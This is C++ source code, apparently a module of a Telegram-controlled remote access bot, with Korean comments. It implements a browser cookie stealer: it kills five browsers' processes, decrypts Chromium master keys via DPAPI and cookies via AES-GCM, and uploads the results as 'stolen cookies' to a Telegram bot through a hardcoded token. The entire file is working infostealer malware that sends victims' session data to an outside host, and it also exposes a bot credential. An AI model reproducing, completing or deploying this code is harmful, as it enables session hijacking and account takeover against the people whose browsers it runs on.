// Command_kkkk.cpp (최종 완성본: 모든 오류 수정 및 상세 보고 기능 탑재)
// 기능: 브라우저 쿠키를 메모리 스트림에 저장 후, 이 파일 내의 전송 함수를 이용해 Telegram으로 직접 전송합니다.

#include "Commands.h"
#include "TelegramApi.h" // SendText 함수만 사용
#include "Config.h"      // CHAT_ID 참조

// --- 기능 구현에 필요한 모든 헤더 ---
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>     // 파일 전송에 필요
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <filesystem>
#include <sstream>       // 메모리 스트림 사용
#include <fstream>       // ifstream 사용
#include <string>
#include <vector>
#include <map>
#include "json.hpp"      // 외부 라이브러리
#include "sqlite3.h"     // 외부 라이브러리

// --- 필요한 라이브러리 링크 ---
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
// 중요: sqlite3.lib는 프로젝트 설정에서 직접 추가하거나, sqlite3.c 파일을 프로젝트에 포함해야 합니다.

using json = nlohmann::json;
using byte = unsigned char;

namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 파일과 격리)

    // =================================================================
    // 1. 파일 전송 기능 (WinHTTP)
    // =================================================================
    bool SendDataAsFile(long long chatId, const std::vector<char>& data, const std::wstring& fileName, const std::wstring& caption) {
        if (data.empty()) return false;

        // multipart/form-data 형식의 HTTP 본문 생성
        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string body;
        body.reserve(data.size() + 1024);
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
        body += std::to_string(chatId) + "\r\n";
        if (!caption.empty()) { body += "--" + boundary + "\r\n"; body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"; body += WToUtf8(caption) + "\r\n"; }
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + WToUtf8(fileName) + "\"\r\n";
        body += "Content-Type: application/octet-stream\r\n\r\n";
        body.append(data.begin(), data.end());
        body += "\r\n";
        body += "--" + boundary + "--\r\n";

        // WinHTTP를 사용한 네트워크 요청
        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
        bool ok = false;

        do {
            hSession = WinHttpOpen(L"CppClient/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) break;
            WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000); // 30초 타임아웃
            hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) break;

            // [404 오류 해결] BOT_TOKEN을 외부에서 참조하지 않고, URL 전체를 직접 하드코딩하여 변수 참조 문제를 원천 차단합니다.
            std::wstring path = L"/bot8494613693:AAG1cNGBuhuja8Pz5zt5dEcwmgg4PXEZ-y8/sendDocument";

            hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest) break;

            std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());
            if (!WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0)) break;
            if (!WinHttpReceiveResponse(hRequest, NULL)) break;

            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
            if (statusCode == 200) ok = true;

        } while (false);

        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return ok;
    }

    // =================================================================
    // 2. 쿠키 탈취 기능 (상세 오류 보고)
    // =================================================================
    namespace BrowserData {

        std::vector<byte> Base64Decode(const std::string& base64_str) {
            std::vector<byte> result;
            DWORD len = 0;
            if (CryptStringToBinaryA(base64_str.c_str(), 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
                result.resize(len);
                if (!CryptStringToBinaryA(base64_str.c_str(), 0, CRYPT_STRING_BASE64, result.data(), &len, NULL, NULL)) result.clear();
            }
            return result;
        }

        bool DecryptDPAPI(const std::vector<byte>& data, std::vector<byte>& decrypted) {
            DATA_BLOB input;
            input.pbData = const_cast<byte*>(data.data());
            input.cbData = static_cast<DWORD>(data.size());
            DATA_BLOB output;
            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                decrypted.assign(output.pbData, output.pbData + output.cbData);
                LocalFree(output.pbData);
                return true;
            }
            SendText(CHAT_ID, WToUtf8(L"❌ DPAPI 복호화 실패! GetLastError(): " + std::to_wstring(GetLastError())));
            return false;
        }

        std::string DecryptAES_GCM(const std::vector<byte>& key, const std::vector<byte>& data) {
            if (data.size() < 18 || (data[0] != 'v' || data[1] != '1' || (data[2] != '0' && data[2] != '1'))) {
                return "";
            }

            std::vector<byte> nonce(data.begin() + 3, data.begin() + 15);
            std::vector<byte> ciphertext(data.begin() + 15, data.end());
            if (ciphertext.size() <= 16) return "";

            BCRYPT_ALG_HANDLE hAlg = NULL;
            BCRYPT_KEY_HANDLE hKey = NULL;
            std::string decrypted_text;
            NTSTATUS status = 0;

            do {
                status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptOpenAlgorithmProvider 실패! NTSTATUS: " + std::to_wstring(status))); break; }

                status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptSetProperty 실패! NTSTATUS: " + std::to_wstring(status))); break; }

                status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0);
                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptGenerateSymmetricKey 실패! NTSTATUS: " + std::to_wstring(status))); break; }

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
                RtlZeroMemory(&auth_info, sizeof(auth_info));
                auth_info.cbSize = sizeof(auth_info);
                auth_info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
                auth_info.pbNonce = nonce.data();
                auth_info.cbNonce = (ULONG)nonce.size();
                auth_info.pbTag = ciphertext.data() + (ciphertext.size() - 16);
                auth_info.cbTag = 16;

                ULONG decrypted_len = 0;
                status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, NULL, 0, &decrypted_len, 0);
                if (!BCRYPT_SUCCESS(status) || decrypted_len == 0) break;

                std::vector<byte> buffer(decrypted_len);
                status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, buffer.data(), (ULONG)buffer.size(), &decrypted_len, 0);
                if (BCRYPT_SUCCESS(status)) decrypted_text.assign(buffer.begin(), buffer.end());

            } while (false);

            if (hKey) BCryptDestroyKey(hKey);
            if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
            return decrypted_text;
        }

        class Extractor {
        public:
            std::string Run() {
                LocatePaths();
                KillBrowserProcesses();
                Sleep(2000);
                for (const auto& [name, path] : m_browser_paths) {
                    if (!std::filesystem::exists(path)) continue;

                    std::vector<byte> key;
                    if (!GetMasterKey(path / "Local State", key)) {
                        SendText(CHAT_ID, WToUtf8(L"❌ [" + name + L"] 마스터 키 획득 최종 실패."));
                        continue;
                    }

                    std::vector<std::wstring> profiles = { L"Default", L"Profile 1", L"Profile 2", L"Profile 3", L"Profile 4", L"Profile 5" };
                    for (const auto& profile : profiles) ExtractFrom(name, path, profile, key);
                }
                return m_output_stream.str();
            }
        private:
            std::filesystem::path m_local_appdata, m_roaming_appdata;
            std::map<std::wstring, std::filesystem::path> m_browser_paths;
            std::stringstream m_output_stream;

            void LocatePaths() {
                PWSTR p = nullptr;
                if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p))) { m_local_appdata = p; CoTaskMemFree(p); }
                if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &p))) { m_roaming_appdata = p; CoTaskMemFree(p); }
                m_browser_paths = {
                    {L"Google Chrome", m_local_appdata / L"Google\\Chrome\\User Data"}, {L"Microsoft Edge", m_local_appdata / L"Microsoft\\Edge\\User Data"},
                    {L"Brave", m_local_appdata / L"BraveSoftware\\Brave-Browser\\User Data"}, {L"Opera", m_roaming_appdata / L"Opera Software\\Opera Stable"},
                    {L"Vivaldi", m_local_appdata / L"Vivaldi\\User Data"}
                };
            }

            void KillBrowserProcesses() {
                const std::vector<const wchar_t*> exes = { L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe", L"vivaldi.exe" };
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap == INVALID_HANDLE_VALUE) return;
                PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
                if (Process32FirstW(snap, &pe32)) {
                    do {
                        for (const auto& exe : exes) {
                            if (_wcsicmp(pe32.szExeFile, exe) == 0) {
                                HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                                if (proc) { TerminateProcess(proc, 1); CloseHandle(proc); }
                            }
                        }
                    } while (Process32NextW(snap, &pe32));
                }
                CloseHandle(snap);
            }

            bool GetMasterKey(const std::filesystem::path& path, std::vector<byte>& masterKey) {
                if (!std::filesystem::exists(path)) return false;

                std::ifstream f(path);
                json state;
                try { f >> state; }
                catch (const json::parse_error& e) {
                    std::string err = "❌ Local State JSON 파싱 실패: "; err += e.what();
                    SendText(CHAT_ID, err);
                    return false;
                }

                if (!state.contains("os_crypt") || !state["os_crypt"].contains("encrypted_key")) {
                    SendText(CHAT_ID, WToUtf8(L"❌ Local State 파일에 encrypted_key가 없습니다."));
                    return false;
                }

                auto key_b64 = Base64Decode(state["os_crypt"]["encrypted_key"]);
                if (key_b64.size() <= 5) return false;

                std::vector<byte> key_encrypted(key_b64.begin() + 5, key_b64.end());
                return DecryptDPAPI(key_encrypted, masterKey);
            }

            void ExtractFrom(const std::wstring& name, const std::filesystem::path& path, const std::wstring& profile, const std::vector<byte>& key) {
                std::filesystem::path db_path = path / profile / "Network" / "Cookies";
                if (name == L"Opera") db_path = path / "Network" / "Cookies";
                if (!std::filesystem::exists(db_path)) return;

                std::filesystem::path temp_db = std::filesystem::temp_directory_path() / L"temp_cookies.db";
                try { std::filesystem::copy_file(db_path, temp_db, std::filesystem::copy_options::overwrite_existing); }
                catch (...) { return; }

                sqlite3* db;
                if (sqlite3_open(temp_db.string().c_str(), &db) != SQLITE_OK) {
                    std::filesystem::remove(temp_db);
                    return;
                }

                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
                    m_output_stream << "\n# Browser: " << WToUtf8(name) << " | Profile: " << WToUtf8(profile) << "\n";
                    int processed = 0, decrypted = 0;
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        processed++;
                        const byte* blob = (const byte*)sqlite3_column_blob(stmt, 3);
                        int size = sqlite3_column_bytes(stmt, 3);
                        std::string dec = DecryptAES_GCM(key, std::vector<byte>(blob, blob + size));
                        if (!dec.empty()) {
                            decrypted++;
                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
                            const char* cname = (const char*)sqlite3_column_text(stmt, 1);
                            const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
                            long long expires = sqlite3_column_int64(stmt, 4);
                            m_output_stream << host << "\tTRUE\t" << cpath << "\tFALSE\t" << expires << "\t" << cname << "\t" << dec << "\n";
                        }
                    }
                    std::wstring log = L"[" + name + L"/" + profile + L"] 처리: " + std::to_wstring(processed) + L", 성공: " + std::to_wstring(decrypted);
                    SendText(CHAT_ID, WToUtf8(log));
                }

                sqlite3_finalize(stmt);
                sqlite3_close(db);
                std::filesystem::remove(temp_db);
            }
        };
    } // namespace BrowserData

    // =================================================================
    // 3. 텔레그램 명령어 핸들러
    // =================================================================
    static bool KkkkHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
        SendText(chatId, WToUtf8(L"⏳ 쿠키 탈취 및 상세 분석 시작..."));

        BrowserData::Extractor extractor;
        std::string cookie_data_str = extractor.Run();

        if (cookie_data_str.empty()) {
            SendText(chatId, WToUtf8(L"❌ 최종 결과: 추출된 데이터가 없습니다."));
            return true;
        }

        std::vector<char> data(cookie_data_str.begin(), cookie_data_str.end());

        std::wstring report = L"✅ 추출 완료. 전송 파일 크기: " + std::to_wstring(data.size()) + L" 바이트";
        SendText(chatId, WToUtf8(report));

        if (SendDataAsFile(chatId, data, L"cookies.txt", L"🍪 탈취된 쿠키 목록입니다.")) {
            SendText(chatId, WToUtf8(L"✅ 파일 전송 성공!"));
        }
        else {
            SendText(chatId, WToUtf8(L"❌ 파일 전송에 실패했습니다."));
        }

        return true;
    }

    // =================================================================
    // 4. 명령어 자동 등록
    // =================================================================
    struct KkkkCommandRegistrar {
        KkkkCommandRegistrar() {
            RegisterCommand("kkkk", KkkkHandler);
        }
    };
    static KkkkCommandRegistrar g_kkkkRegistrar;

} // 익명 네임스페이스 종료
static std::string WToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return {};
    std::string out(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
    if (!out.empty() && out.back() == '\0') out.pop_back();
    return out;
}